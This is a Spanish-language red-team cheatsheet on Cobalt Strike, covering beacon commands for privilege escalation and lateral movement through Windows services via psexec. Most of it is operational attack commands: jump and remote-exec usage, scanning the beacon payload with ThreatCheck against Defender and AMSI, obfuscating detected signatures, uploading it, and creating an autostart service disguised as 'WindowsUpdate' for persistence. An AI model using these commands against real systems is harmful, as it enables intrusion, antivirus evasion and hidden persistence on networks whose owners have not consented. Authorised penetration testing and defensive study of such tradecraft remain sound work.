---
title: Cobalt Strike — Service Creations
tags: [cobalt-strike, beacon, cheatsheet, services, psexec, opsec, threatcheck]
---

# Service Creations (CS)

## Comandos relacionados con servicios

| Comando | Descripción |
|---------|-------------|
| `elevate svc-exe <listener>` | Elevación de privilegios via servicio |
| `remote-exec psexec <host> <cmd>` | Ejecutar comando remoto via servicio |
| `jump psexec <host> <listener>` | Movimiento lateral (x86 service) |
| `jump psexec64 <host> <listener>` | Movimiento lateral (x64 service) |
| `jump psexec_psh <host> <listener>` | Movimiento lateral via PowerShell |

## Limitación de spawnto con servicios

Los servicios de Windows **no heredan variables de entorno del usuario**. Si `spawnto` usa `%windir%`, fallará.

### Solución: ak-settings

```
beacon> ak-settings spawnto_x64 c:\windows\sysnative\dllhost.exe
beacon> ak-settings spawnto_x86 c:\windows\syswow64\dllhost.exe
```

> [!important] Usar rutas absolutas, no variables de entorno, para `spawnto` en contexto de servicio.

## Workflow OPSEC correcto para psexec

1. **Generar el artifact** apropiado en Cobalt Strike (Service EXE)
2. **ThreatCheck** — pasar por detector antes de usar:
   ```powershell
   .\ThreatCheck.exe -f beacon-svc.exe -e Defender
   .\ThreatCheck.exe -f beacon-svc.exe -e AMSI
   ```
3. **Ofuscar las firmas** detectadas si las hay
4. **Subir al objetivo** en un path no sospechoso
5. **Crear el servicio** con nombre legítimo

```
beacon> upload C:\Payloads\update-svc.exe
beacon> shell sc create WindowsUpdate binpath= "C:\Windows\update-svc.exe" start= auto
beacon> shell sc start WindowsUpdate
```

> [!warning] PsExec es uno de los movimientos laterales más detectados. Usar SMB beacons cuando sea posible para reducir el footprint.
